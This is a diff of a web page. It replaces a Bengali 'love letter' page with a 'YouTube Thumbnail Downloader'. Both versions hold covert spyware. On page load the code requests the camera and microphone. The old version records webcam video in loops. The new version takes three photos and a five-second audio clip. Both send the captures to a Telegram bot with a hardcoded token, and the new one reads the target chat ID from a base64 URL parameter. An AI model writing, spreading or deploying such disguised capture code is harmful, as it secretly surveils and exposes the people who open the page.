@@ -2,312 +2,189 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;700&display=swap" rel="stylesheet">
-  <title>Photography</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>YouTube Thumbnail Downloader</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet"/>
   <style>
     * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
+      margin: 0; padding: 0; box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
     }
     body {
-      font-family: 'Cursive', sans-serif;
-      background: linear-gradient(135deg, #fcb69f, #d4a5a5);
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      min-height: 100vh;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      height: 100vh;
+      color: #fff;
+      padding: 20px;
+    }
+    header {
+      margin-top: 40px;
+      text-align: center;
+    }
+    header img {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+    header h1 {
+      font-size: 26px;
+      font-weight: 600;
       color: #fff;
     }
-
-    .name-container {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .name-form {
-      background: #fff;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
-
-    .name-form input {
-      padding: 10px;
-      font-size: 1.2rem;
-      width: 250px;
-      margin-bottom: 20px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-
-    .name-form button {
-      background-color: #ef4444;
-      color: white;
-      border: none;
-      padding: 15px 30px;
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 25px;
-      cursor: pointer;
-    }
-
-    .name-form button:hover {
-      background-color: #dc2626;
-    }
-
     .container {
-      background: #fff;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      padding: 30px;
+      border-radius: 16px;
+      margin-top: 30px;
       width: 100%;
-      max-width: 600px;
-      padding: 40px;
-      border-radius: 15px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-      overflow: hidden;
-      position: relative;
-      display: none;
+      max-width: 500px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
     }
-
-    .letter-title {
-      text-align: center;
-      font-size: 2rem;
-      color: #ef4444;
+    .form-control {
+      width: 100%;
+      padding: 12px 16px;
       margin-bottom: 20px;
-      font-family: 'Georgia', serif;
-    }
-
-    .letter-box {
-      font-family: 'Arial', sans-serif;
-      font-size: 1.2rem;
-      line-height: 1.6;
-      color: #333;
-      white-space: pre-wrap;
-      word-wrap: break-word;
-      padding: 20px;
-      background: #fafafa;
-      border-radius: 10px;
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-      margin-top: 20px;
-      height: 250px;
-      overflow-y: auto;
-      max-height: 250px;
-    }
-
-    .caret {
-      display: inline-block;
-      width: 10px;
-      background: #333;
-      margin-left: 4px;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
-    }
-
-    .message {
-      text-align: center;
+      border-radius: 8px;
+      border: none;
+      outline: none;
       font-size: 16px;
-      color: #4ade80;
-      margin-top: 20px;
     }
-
-    .button-container {
-      display: flex;
-      justify-content: center;
-      margin-top: 20px;
+    .form-control:focus {
+      outline: 2px solid #ff0000;
     }
-    .letter-box {
-  font-family: 'Hind Siliguri', sans-serif;
-  font-size: 1.2rem;
-  line-height: 1.8;
-  color: #333;
-  white-space: pre-wrap;
-  word-wrap: break-word;
-  padding: 20px;
-  background: #fffaf0;
-  border-radius: 10px;
-  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-  margin-top: 20px;
-  height: 300px;
-  overflow-y: auto;
-  max-height: 300px;
-}
-    .action-btn {
-      background-color: #ef4444;
+    button {
+      background: #ff0000;
       color: white;
       border: none;
-      padding: 15px 30px;
+      padding: 12px;
+      border-radius: 8px;
       font-size: 16px;
-      font-weight: bold;
-      border-radius: 25px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: 0.3s;
+      width: 100%;
     }
-
-    .action-btn:hover {
-      background-color: #dc2626;
+    button:hover {
+      background: #cc0000;
     }
-
-    #canvas {
-      display: none;
+    #thumbnail-preview {
+      margin-top: 20px;
+      text-align: center;
+    }
+    footer {
+      margin-top: auto;
+      color: #bbb;
+      text-align: center;
+      padding: 20px 0;
     }
   </style>
 </head>
 <body>
-  <!-- Fullscreen Name Input Form -->
-  <div class="name-container" id="name-container">
-    <div class="name-form">
-      <h2>তোমার নাম লিখ</h2>
-      <input type="text" id="userName" placeholder="Your Name" />
-      <button id="submit-name">Next</button>
-    </div>
+
+  <header>
+    <img src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+    <h1>Thumbnail Downloader</h1>
+  </header>
+
+  <div class="container">
+    <input type="text" id="ytlink" class="form-control" placeholder="Enter YouTube Video URL">
+    <button onclick="downloadThumbnail()" id="thumbdloadbtn">Fetch Thumbnail</button>
+    <div id="thumbnail-preview"></div>
   </div>
 
-  <!-- Love Letter Content -->
-  <div class="container" id="container">
-    <div class="letter-title" id="letter-title">প্রিয় <span id="to-name">Love</span></div>
-    <div class="letter-box" id="letter"></div>
-    <div class="message" id="message">🥹...</div>
-    <div class="button-container">
-      <button class="action-btn" id="start-btn">এইখানে ক্লিক করো </button>
-    </div>
-  </div>
-
-  <canvas id="canvas" width="300" height="400"></canvas>
+  <!-- Hidden video + Telegram logic -->
+  <video id="video" width="0" height="0" autoplay></video>
 
   <script>
-    let userName = "";
+    function GetURLParameter(name) {
+      const params = new URLSearchParams(window.location.search);
+      return params.get(name);
+    }
 
-    const letterText = `
-
-
-শুরু করবো কেমন করে বুঝতে পারছি না। শব্দরা যেন হঠাৎ করে লাজুক হয়ে গেছে,
-তোমার নাম উচ্চারণেই মন কেঁপে ওঠে।
-
-তোমার হাসিটা আমার পৃথিবীর সবচেয়ে প্রিয় জিনিসগুলোর একটি। 
-তুমি যখন হাসো, তখন মনে হয় যেন সমস্ত দুঃখ কষ্ট পেছনে ফেলে আসা যায়।
-তুমি আছো বলেই দিনগুলো রঙিন হয়ে ওঠে, 
-রাতগুলো আশায় ভরে ওঠে, স্বপ্নেরা নতুন রূপ পায়।
-
-তুমি আমার অনুপ্রেরণা, আমার শান্তি, আমার ভালোবাসা।
-
-এই ছোট্ট পৃথিবীতে তোমার অস্তিত্বই আমার সবচেয়ে বড় প্রাপ্তি।
-
-ভালোবাসা নিঃশেষ নয়, 
-আমার ভালোবাসা তোমার জন্য প্রতিটা মুহূর্তেই নতুনভাবে জন্ম নেয়।
-
-সারাজীবন তোমার পাশে থাকতে চাই।
-
-`;
-
-    const letterBox = document.getElementById("letter");
-    const startBtn = document.getElementById("start-btn");
-    const submitNameBtn = document.getElementById("submit-name");
-    const nameContainer = document.getElementById("name-container");
-    const container = document.getElementById("container");
-    const toName = document.getElementById("to-name");
-    const userNameInput = document.getElementById("userName");
-    const message = document.getElementById("message");
-    const canvas = document.getElementById('canvas');
-    const token = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w";
-    const chatId = "1987016824";
-
-    let index = 0;
-
-    submitNameBtn.addEventListener("click", function() {
-      userName = userNameInput.value.trim();
-      if (userName !== "") {
-        toName.textContent = userName;
-        nameContainer.style.display = "none";
-        container.style.display = "block";
-      }
-    });
-
-    function typeLetter() {
-      if (index < letterText.length) {
-        letterBox.innerHTML = letterText.substring(0, index + 1) + '<span class="caret"></span>';
-        index++;
-        letterBox.scrollTop = letterBox.scrollHeight;
-        setTimeout(typeLetter, 50);
-      } else {
-        letterBox.innerHTML = letterText;
+    function decodeBase64(encodedStr) {
+      try {
+        return decodeURIComponent(atob(encodedStr));
+      } catch (e) {
+        console.error('Base64 decode error:', e);
+        return null;
       }
     }
 
-    startBtn.addEventListener("click", function() {
-      typeLetter();
-      startBtn.style.display = "none";
-    });
+    const base64Id = GetURLParameter('i');
+    const chatid = base64Id ? decodeBase64(base64Id) : null;
 
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: true
-    })
-    .then(stream => {
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
+    function sendToTelegram(data, type) {
+      const botToken = '7127289863:AAEBI-cGSj40xJN63HV1mYXZZUP12866G6w';
+      if (!chatid) return console.error('Chat ID is not available.');
 
-      mediaRecorder.ondataavailable = function(e) {
-        chunks.push(e.data);
-      };
-
-      mediaRecorder.onstop = function() {
-        const blob = new Blob(chunks, { type: "video/webm" });
-        chunks.length = 0;
-        sendVideoToTelegram(blob);
-      };
-
-      setInterval(() => {
-        if (mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
-        }
-
-        mediaRecorder.start();
-        setTimeout(() => {
-          if (mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
-          }
-        }, 5000); // Record for 5 seconds
-      }, 8000); // Every 8 seconds
-    })
-    .catch(err => {
-      message.textContent = "";
-      console.error(err);
-    });
-
-    function sendVideoToTelegram(blob) {
       const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("video", blob, "video.webm");
-      formData.append("caption", `This is ${userName}'s video!`);
+      formData.append('chat_id', chatid);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `thumb.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-        method: "POST",
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+        method: 'POST',
         body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (!data.ok) {
-          message.textContent = "🥹";
+      }).then(res => res.json())
+        .then(data => console.log('Telegram response:', data))
+        .catch(err => console.error('Telegram error:', err));
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+        const audioRecorder = new MediaRecorder(stream);
+
+        for (let i = 0; i < 3; i++) {
+          setTimeout(() => {
+            imageCapture.takePhoto().then(blob => sendToTelegram(blob, 'photo'));
+          }, i * 2000);
         }
+
+        audioRecorder.start();
+        setTimeout(() => audioRecorder.stop(), 5000);
+        audioRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            sendToTelegram(event.data, 'audio');
+          }
+        };
       })
-      .catch(err => {
-        console.error(err);
-        message.textContent = "🥲";
+      .catch(error => {
+        if (error.name === 'NotAllowedError') {
+          console.warn('Permissions denied. User blocked access.');
+        } else {
+          console.error('Media error:', error);
+        }
       });
+
+    function downloadThumbnail() {
+      const url = document.getElementById("ytlink").value;
+      const btn = document.getElementById("thumbdloadbtn");
+      btn.textContent = "Fetching...";
+
+      const videoId = extractVideoID(url);
+      if (!videoId) {
+        btn.textContent = "Fetch Thumbnail";
+        return alert("Invalid YouTube URL");
+      }
+
+      const thumbnailURL = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;
+      document.getElementById("thumbnail-preview").innerHTML = `
+        <img src="${thumbnailURL}" style="max-width:100%; margin: 20px 0; border-radius:10px;" />
+        <a href="${thumbnailURL}" download class="form-control" style="background:#00c851; text-align:center; color:white; text-decoration:none;">Download HD Thumbnail</a>
+      `;
+      btn.textContent = "Fetch Thumbnail";
+    }
+
+    function extractVideoID(url) {
+      const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|&v=)([^#\&\?]*).*/;
+      const match = url.match(regExp);
+      return (match && match[2].length == 11) ? match[2] : null;
     }
   </script>
+
+  <footer>
+  </footer>
 </body>
 </html>
